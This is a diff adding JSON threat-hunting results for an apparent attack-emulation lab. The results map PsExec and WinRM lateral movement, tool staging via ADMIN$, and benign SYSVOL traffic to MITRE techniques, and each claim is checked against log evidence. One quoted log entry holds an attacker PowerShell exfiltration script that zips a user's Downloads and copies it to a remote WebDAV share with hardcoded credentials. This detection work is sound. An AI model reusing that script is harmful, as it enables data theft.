+          "id": "AaFZRvJfH5wFd7c82Oiy",
+          "field": "process.parent.executable",
+          "value": "C:\\Windows\\System32\\services.exe",
+          "query_id": "q-f416380fba"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7c5yloe",
+          "field": "win.TargetFilename",
+          "value": "C:\\Windows\\Temp\\Rar.exe",
+          "query_id": "q-5922ed391a"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7culih9",
+          "field": "win.TargetFilename",
+          "value": "C:\\Windows\\Temp\\sdelete64.exe",
+          "query_id": "q-5922ed391a"
+        }
+      ],
+      "verification": [
+        {
+          "index": ".ds-logs-windows.security-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7niyNu7",
+          "field": "win.RelativeTargetName",
+          "claimed": "PSEXESVC.exe",
+          "query_id": "q-133ecfed5d",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-4502c1a1f3",
+            "q-d67e250095",
+            "q-4c06eb98d3",
+            "q-133ecfed5d",
+            "q-caeb6674f0"
+          ],
+          "actual": "PSEXESVC.exe",
+          "timestamp": "2020-05-01T23:11:18.000-04:00",
+          "host": "nashua.dmevals.local",
+          "dataset": "windows.security"
+        },
+        {
+          "index": ".ds-logs-windows.security-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7niyNu7",
+          "field": "win.ShareName",
+          "claimed": "\\\\*\\ADMIN$",
+          "query_id": "q-133ecfed5d",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-4502c1a1f3",
+            "q-d67e250095",
+            "q-4c06eb98d3",
+            "q-133ecfed5d",
+            "q-caeb6674f0"
+          ],
+          "actual": "\\\\*\\ADMIN$",
+          "timestamp": "2020-05-01T23:11:18.000-04:00",
+          "host": "nashua.dmevals.local",
+          "dataset": "windows.security"
+        },
+        {
+          "index": ".ds-logs-windows.security-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7niyNu7",
+          "field": "win.IpAddress",
+          "claimed": "10.0.1.4",
+          "query_id": "q-133ecfed5d",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-4502c1a1f3",
+            "q-d67e250095",
+            "q-4c06eb98d3",
+            "q-133ecfed5d",
+            "q-caeb6674f0"
+          ],
+          "actual": "10.0.1.4",
+          "timestamp": "2020-05-01T23:11:18.000-04:00",
+          "host": "nashua.dmevals.local",
+          "dataset": "windows.security"
+        },
+        {
+          "index": ".ds-logs-windows.security-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7niytvL",
+          "field": "win.RelativeTargetName",
+          "claimed": "Temp\\python.exe",
+          "query_id": "q-cf7b110726",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-4502c1a1f3",
+            "q-d67e250095",
+            "q-4c06eb98d3",
+            "q-cf7b110726",
+            "q-9567cfd66b"
+          ],
+          "actual": "Temp\\python.exe",
+          "timestamp": "2020-05-01T23:10:23.000-04:00",
+          "host": "nashua.dmevals.local",
+          "dataset": "windows.security"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7h03ALx",
+          "field": "win.TargetFilename",
+          "claimed": "C:\\Windows\\PSEXESVC.exe",
+          "query_id": "q-09e9733b73",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-09e9733b73",
+            "q-5922ed391a",
+            "q-b543f08e7b"
+          ],
+          "actual": "C:\\Windows\\PSEXESVC.exe",
+          "timestamp": "2020-05-02T03:11:18.864Z",
+          "host": "nashua.dmevals.local",
+          "dataset": "windows.sysmon"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7c82-ha",
+          "field": "win.TargetFilename",
+          "claimed": "C:\\Windows\\Temp\\python.exe",
+          "query_id": "q-a74fa56090",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-f29316980d",
+            "q-a74fa56090",
+            "q-5922ed391a",
+            "q-57a9b5e5df"
+          ],
+          "actual": "C:\\Windows\\Temp\\python.exe",
+          "timestamp": "2020-05-02T03:10:23.626Z",
+          "host": "nashua.dmevals.local",
+          "dataset": "windows.sysmon"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7c82Oiy",
+          "field": "process.executable",
+          "claimed": "C:\\Windows\\PSEXESVC.exe",
+          "query_id": "q-f416380fba",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-10e292fc55",
+            "q-4376915466",
+            "q-ebede971ad",
+            "q-cd1a654ba3",
+            "q-4edda752cc"
+          ],
+          "actual": "C:\\Windows\\PSEXESVC.exe",
+          "timestamp": "2020-05-02T03:11:39.934Z",
+          "host": "nashua.dmevals.local",
+          "dataset": "windows.sysmon"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7c82Oiy",
+          "field": "process.parent.executable",
+          "claimed": "C:\\Windows\\System32\\services.exe",
+          "query_id": "q-f416380fba",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-10e292fc55",
+            "q-4376915466",
+            "q-ebede971ad",
+            "q-cd1a654ba3",
+            "q-4edda752cc"
+          ],
+          "actual": "C:\\Windows\\System32\\services.exe",
+          "timestamp": "2020-05-02T03:11:39.934Z",
+          "host": "nashua.dmevals.local",
+          "dataset": "windows.sysmon"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7c5yloe",
+          "field": "win.TargetFilename",
+          "claimed": "C:\\Windows\\Temp\\Rar.exe",
+          "query_id": "q-5922ed391a",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-5922ed391a",
+            "q-c8ca37ee88"
+          ],
+          "actual": "C:\\Windows\\Temp\\Rar.exe",
+          "timestamp": "2020-05-02T03:15:31.530Z",
+          "host": "nashua.dmevals.local",
+          "dataset": "windows.sysmon"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7culih9",
+          "field": "win.TargetFilename",
+          "claimed": "C:\\Windows\\Temp\\sdelete64.exe",
+          "query_id": "q-5922ed391a",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-5922ed391a",
+            "q-316fa0c090"
+          ],
+          "actual": "C:\\Windows\\Temp\\sdelete64.exe",
+          "timestamp": "2020-05-02T03:15:38.985Z",
+          "host": "nashua.dmevals.local",
+          "dataset": "windows.sysmon"
+        }
+      ],
+      "verified": true,
+      "verified_evidence": 10
+    },
+    {
+      "technique": "T1570",
+      "title": "SYSVOL/IPC$ share access by machine accounts (NEWYORK$, SCRANTON$) — benign domain replication traffic",
+      "assessment": "benign",
+      "confidence": "medium",
+      "summary": "The remaining 5140/5145 share hits are SYSVOL and IPC$ access by machine accounts: NEWYORK$ from fe80::e40c:95b6:b0a7:6429 and SCRANTON$ from 10.0.1.4 on newyork.dmevals.local, plus IPC$ sessions. These are read-oriented domain controller replication/Group Policy and SMB session setup patterns (SYSVOL share path \\\\??\\F:\\SYSVOL\\sysvol), not tool staging. No file writes to ADMIN$ or other hosts were observed from these accounts, so they are assessed as normal domain behaviour rather than lateral tool transfer.",
+      "evidence": [
+        {
+          "index": ".ds-logs-windows.security-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7rxEjIW",
+          "field": "win.ShareName",
+          "value": "\\\\*\\SYSVOL",
+          "query_id": "q-d67e250095"
+        },
+        {
+          "index": ".ds-logs-windows.security-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7rxEjIW",
+          "field": "user.name",
+          "value": "NEWYORK$",
+          "query_id": "q-d67e250095"
+        },
+        {
+          "index": ".ds-logs-windows.security-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7ns-ApD",
+          "field": "user.name",
+          "value": "SCRANTON$",
+          "query_id": "q-d67e250095"
+        }
+      ],
+      "verification": [
+        {
+          "index": ".ds-logs-windows.security-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7rxEjIW",
+          "field": "win.ShareName",
+          "claimed": "\\\\*\\SYSVOL",
+          "query_id": "q-d67e250095",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-4502c1a1f3",
+            "q-d67e250095",
+            "q-27922b6776",
+            "q-a0de3a7546",
+            "q-c1122635e1"
+          ],
+          "actual": "\\\\*\\SYSVOL",
+          "timestamp": "2020-05-01T22:56:47.000-04:00",
+          "host": "newyork.dmevals.local",
+          "dataset": "windows.security"
+        },
+        {
+          "index": ".ds-logs-windows.security-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7rxEjIW",
+          "field": "user.name",
+          "claimed": "NEWYORK$",
+          "query_id": "q-d67e250095",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-4502c1a1f3",
+            "q-d67e250095",
+            "q-27922b6776",
+            "q-a0de3a7546",
+            "q-c1122635e1"
+          ],
+          "actual": "NEWYORK$",
+          "timestamp": "2020-05-01T22:56:47.000-04:00",
+          "host": "newyork.dmevals.local",
+          "dataset": "windows.security"
+        },
+        {
+          "index": ".ds-logs-windows.security-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7ns-ApD",
+          "field": "user.name",
+          "claimed": "SCRANTON$",
+          "query_id": "q-d67e250095",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-4502c1a1f3",
+            "q-d67e250095",
+            "q-27922b6776",
+            "q-1fdfadec32",
+            "q-5c50d1b0d2"
+          ],
+          "actual": "SCRANTON$",
+          "timestamp": "2020-05-01T23:01:43.000-04:00",
+          "host": "newyork.dmevals.local",
+          "dataset": "windows.security"
+        }
+      ],
+      "verified": true,
+      "verified_evidence": 3
+    },
+    {
+      "technique": "T1570",
+      "title": "PowerShell Invoke-Exfil script on SCRANTON copies archive to remote WebDAV share",
+      "assessment": "suspicious",
+      "confidence": "medium",
+      "summary": "On scranton.dmevals.local, user pbeesly executed a script block (4104, ScriptBlock ID b2b03a9c-43f0-4285-837d-f22d4600b2ae, path C:\\Program Files\\SysinternalsSuite\\psversion.ps1) defining Invoke-Exfil: it installs 7Zip4Powershell, compresses the user's Downloads folder into %APPDATA%\\OfficeSupplies.7z with password 'lolol', maps a drive to \\\\192.168.0.4\\webdav using hardcoded credentials (cozy / MyCozyPassw0rd!) and Copy-Item's the archive there. This is file transfer to a remote share, but the direction is outbound staging/exfiltration rather than moving tools onto a victim host, so it is recorded as suspicious supporting context for the same actor on the same host rather than a T1570 tool-transfer instance.",
+      "evidence": [
+        {
+          "index": ".ds-logs-windows.powershell-default-2026.10.20-000001",
+          "id": "AaFZR_JfH5wFd7qjPglL",
+          "field": "win.ScriptBlockText",
+          "value": "Copy-Item \"$env:APPDATA\\OfficeSupplies.7z\" \"WebDavShare:\\OfficeSupplies.7z\" -Force",
+          "query_id": "q-df4efb1457"
+        },
+        {
+          "index": ".ds-logs-windows.powershell-default-2026.10.20-000001",
+          "id": "AaFZR_JfH5wFd7qjPglL",
+          "field": "win.Path",
+          "value": "C:\\Program Files\\SysinternalsSuite\\psversion.ps1",
+          "query_id": "q-df4efb1457"
+        },
+        {
+          "index": ".ds-logs-windows.powershell-default-2026.10.20-000001",
+          "id": "AaFZR_JfH5wFd7qjPglL",
+          "field": "host.name",
+          "value": "scranton.dmevals.local",
+          "query_id": "q-df4efb1457"
+        }
+      ],
+      "verification": [
+        {
+          "index": ".ds-logs-windows.powershell-default-2026.10.20-000001",
+          "id": "AaFZR_JfH5wFd7qjPglL",
+          "field": "win.ScriptBlockText",
+          "claimed": "Copy-Item \"$env:APPDATA\\OfficeSupplies.7z\" \"WebDavShare:\\OfficeSupplies.7z\" -Force",
+          "query_id": "q-df4efb1457",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-c1952cb2f9",
+            "q-ac6eafecf1",
+            "q-78a48e82cb",
+            "q-49167d2324",
+            "q-1a81738021"
+          ],
+          "actual": "function Invoke-Exfil {\n\n    if (!(Get-Module -Name \"7Zip4Powershell\")) { Write-Host \"[*] Installing 7Zip4Powershell module\"; Install-Module -Name 7Zip4Powershell -Force }\n\n    Write-Host \"[*] Compressing all the things in download dir\"\n    Compress-7Zip -Path \"$env:USERPROFILE\\Downloads\\\" -Filter * -Password \"lolol\" -ArchiveFileName \"$env:APPDATA\\OfficeSupplies.7z\"\n\n    $UserName = \"cozy\"\n    $Password = \"MyCozyPassw0rd!\" | ConvertTo-SecureString -AsPlainText -Force\n    $Creds = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $UserName, $Password\n\n    $WebDavShare...(truncated)",
+          "timestamp": "2020-05-01T23:08:02.000-04:00",
+          "host": "scranton.dmevals.local",
+          "dataset": "windows.powershell"
+        },
+        {
+          "index": ".ds-logs-windows.powershell-default-2026.10.20-000001",
+          "id": "AaFZR_JfH5wFd7qjPglL",
+          "field": "win.Path",
+          "claimed": "C:\\Program Files\\SysinternalsSuite\\psversion.ps1",
+          "query_id": "q-df4efb1457",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-c1952cb2f9",
+            "q-ac6eafecf1",
+            "q-78a48e82cb",
+            "q-49167d2324",
+            "q-1a81738021"
+          ],
+          "actual": "C:\\Program Files\\SysinternalsSuite\\psversion.ps1",
+          "timestamp": "2020-05-01T23:08:02.000-04:00",
+          "host": "scranton.dmevals.local",
+          "dataset": "windows.powershell"
+        },
+        {
+          "index": ".ds-logs-windows.powershell-default-2026.10.20-000001",
+          "id": "AaFZR_JfH5wFd7qjPglL",
+          "field": "host.name",
+          "claimed": "scranton.dmevals.local",
+          "query_id": "q-df4efb1457",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-c1952cb2f9",
+            "q-ac6eafecf1",
+            "q-78a48e82cb",
+            "q-49167d2324",
+            "q-1a81738021"
+          ],
+          "actual": "scranton.dmevals.local",
+          "timestamp": "2020-05-01T23:08:02.000-04:00",
+          "host": "scranton.dmevals.local",
+          "dataset": "windows.powershell"
+        }
+      ],
+      "verified": true,
+      "verified_evidence": 3
+    }
+  ],
+  "technique_status": {
+    "T1021": {
+      "status": "malicious",
+      "reason": "Remote service use from scranton.dmevals.local (10.0.1.4) by pbeesly against nashua.dmevals.local: WinRM Invoke-Command to NASHUA followed by four PsExec64 executions with cleartext credentials, PSEXESVC service installs and ADMIN$ access on NASHUA."
+    },
+    "T1021.001": {
+      "status": "suspicious",
+      "reason": "Two LogonType 10 logons for pbeesly on SCRANTON from 172.18.39.2 (Workstation SCRANTON), but no mstsc.exe, no 4778/4779 and no outbound 3389 from a workstation - inbound RDP session, not confirmed host-to-host RDP pivoting."
+    },
+    "T1021.002": {
+      "status": "malicious",
+      "reason": "PsExec64.exe \\\\NASHUA with -u/-p credentials executed 4x from PowerShell on SCRANTON; PSEXESVC service installed 4x and ADMIN$ (\\??\\C:\\windows) accessed from 10.0.1.4 on NASHUA, running C:\\Windows\\Temp\\python.exe."
+    },
+    "T1021.003": {
+      "status": "not_observed",
+      "reason": "No DCOM artifacts: no LogonType 3 with svchost process name, no MMC20.Application/ShellWindows/ShellBrowserWindow script blocks; only a benign Invoke-CimMethod alias definition."
+    },
+    "T1021.004": {
+      "status": "not_observed",
+      "reason": "No port 22 connections in sysmon or zeek, no sshd service installs, no ssh/plink script blocks."
+    },
+    "T1021.005": {
+      "status": "not_observed",
+      "reason": "No port 5900 connections, no vnc/tvnserver binaries, services or script blocks."
+    },
+    "T1021.006": {
+      "status": "malicious",
+      "reason": "Invoke-Command -ComputerName NASHUA executed by pbeesly on SCRANTON with matching powershell.exe outbound TCP 5985 connections from 10.0.1.4 to 10.0.1.6, immediately preceding the PsExec movement to the same host."
+    },
+    "T1072": {
+      "status": "malicious",
+      "reason": "PsExec64.exe (Sysinternals software-deployment/remote-execution tool) was run four times from powershell.exe on scranton.dmevals.local targeting \\\\NASHUA with cleartext credentials, installing PSEXESVC on nashua.dmevals.local (event 7045) and spawning C:\\Windows\\Temp\\python.exe as pbeesly under PSEXESVC.exe — clear lateral movement via a deployment tool. Other deployment-like hits (Azure WaAppAgent logman traces, javamtsup service, hostui.exe) are benign platform activity; no SCCM/Intune/SMS agent activity was observed."
+    },
+    "T1080": {
+      "status": "not_observed",
+      "reason": "All share activity in the retrieved events is read-only or PsExec service staging, not tainting of shared content. 5145/5140 events touch only SYSVOL (read masks 0x100081/0x120089 on GPO files), IPC$ and ADMIN$; Zeek smb_files shows exclusively SMB::FILE_OPEN on \\\\NEWYORK.dmevals.local\\sysvol with no write/rename/delete; Sysmon event.code 11 shows no UNC/network-path file creations; 7045 service ImagePaths are local (%SystemRoot%\\PSEXESVC.exe, C:\\Windows\\System32\\javamtsup.exe). The ADMIN$ writes of PSEXESVC.exe and Temp\\python.exe by pbeesly from 10.0.1.4 to nashua are remote-execution staging (T1021.002/T1569.002), and the Invoke-Exfil script block writes to a WebDAV share for exfiltration - neither is T1080."
+    },
+    "T1091": {
+      "status": "not_observed",
+      "reason": "No removable-media activity exists in the data. All non-C: drive writes are fixed-disk operations: DFSRs.exe writing F:\\System Volume Information\\DFSR\\Config\\*.XML.TMP on newyork (14 events) and smss.exe creating D:\\pagefile.sys on scranton. windows.other volume-health events identify C:, D: and \\\\?\\Volume{d1b3f076-...} as \\Device\\HarddiskVolume* fixed disks; no USB/removable device or drive-insertion events were found, and the Sysinternals Volumeid.exe files were written to C:\\Users\\pbeesly\\Downloads. The lateral movement that is present (PsExec64 from scranton to \\\\NASHUA launching C:\\Windows\\Temp\\python.exe, then Rar.exe archiving and sdelete64 wiping) is SMB/network-based, not removable-media replication."
+    },
+    "T1210": {
+      "status": "malicious",
+      "reason": "Compromised SCRANTON (steganographic PowerShell loader as pbeesly) used PowerShell to connect to NASHUA 10.0.1.6:5985 (WinRM) at 03:09:23-29Z; NASHUA spawned wsmprovhost.exe as pbeesly and Kerberos LogonType 3 events from 10.0.1.4 followed, after which the remote session enumerated processes and archived user documents with Compress-Archive/Rar.exe. Remaining 445/5985 traffic is System/machine-account DC activity."
+    },
+    "T1534": {
+      "status": "suspicious",
+      "reason": "No mail-borne internal spearphishing was observed (4104 URL/mail hits are benign module manifests; no 4625 failures; zeek window does not overlap). However, the same intrusion shows attacker-driven internal remote execution: PsExec64 from scranton.dmevals.local to nashua.dmevals.local with pbeesly's plaintext password, PSEXESVC service installs, and C:\\Windows\\Temp\\python.exe beaconing to 192.168.0.4:8443 — internal credential use/lateral movement consistent with the T1534 family hypothesis, though the delivery vector itself was not captured."
+    },
+    "T1550": {
+      "status": "malicious",
+      "reason": "pbeesly on scranton ran PsExec64.exe four times with -u dmevals\\pbeesly -p <cleartext password> against \\\\NASHUA, producing 4648 explicit-credential logons, PSEXESVC service installs (7045) and SYSTEM PSEXESVC.exe processes on nashua, followed by sdelete64 cleanup on nashua."
+    },
+    "T1550.002": {
+      "status": "suspicious",
+      "reason": "One NTLM (NtLmSsp, NTLM V2) type-3 logon for pbeesly on scranton from 172.18.39.2, consistent with the PsExec alternate-credential move; no credential-dumping precursor or anomalous LSASS access, so pass-the-hash itself is not confirmed."
+    },
+    "T1550.003": {
+      "status": "not_observed",
+      "reason": "Kerberos 4769 requests are normal TGT/service-ticket acquisitions from 10.0.1.4; no PreAuthType 0 logons and zero Rubeus/kirbi/asktgt script blocks."
+    },
+    "T1563": {
+      "status": "not_observed",
+      "reason": "No session hijacking artifacts: no tscon/mstsc/qwinsta/query session process creations, no Enter-PSSession/New-PSSession script blocks. The 120 PowerShell 4104 matches were built-in CimCmdlets module text containing 'Session'/'CimSession'. The only remote-interactive logon (scranton, 03:20:46Z, pbeesly from 172.18.39.2) is a fresh LogonType 10 session with rdpclip/explorer/LogonUI spawned by TermService. Actual lateral movement was PsExec (T1021.002), outside this family."
+    },
+    "T1563.002": {
+      "status": "not_observed",
+      "reason": "The single inbound 3389 connection (scranton, 172.18.39.2 -> 10.0.1.4, Initiated false) corresponds to a legitimate new RDP logon for pbeesly (LogonType 10, User32, TerminalSessionId 2, rdpclip.exe child of TermService). No tscon.exe execution, no session redirection, no mstsc/winrs/ssh command lines — no evidence of RDP session takeover."
+    },
+    "T1570": {
+      "status": "malicious",
+      "reason": "pbeesly on scranton (10.0.1.4) wrote Temp\\python.exe and PSEXESVC.exe into nashua's ADMIN$ share (5145 with WriteData/AppendData); Sysmon confirms C:\\Windows\\Temp\\python.exe and C:\\Windows\\PSEXESVC.exe created on nashua, PSEXESVC.exe then ran as SYSTEM from services.exe, and the transferred python.exe dropped Rar.exe and sdelete64.exe into C:\\Windows\\Temp — repeated four times between 03:10 and 03:15Z."
+    }
+  }
+}
